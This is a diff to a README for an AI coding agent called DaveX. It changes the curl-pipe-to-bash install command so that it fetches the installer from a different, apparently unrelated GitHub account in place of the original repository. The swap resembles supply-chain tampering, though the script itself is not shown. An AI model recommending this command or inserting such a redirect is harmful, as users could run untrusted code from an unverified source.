@@ -24,7 +24,7 @@ DaveX is a coding-first AI agent that works like Claude Code and Gemini CLI in y
 ## Install
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/sixpert/davex/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/masonjenkins893-dot/davex/master/install.sh | bash
 ```
 
 Then run:
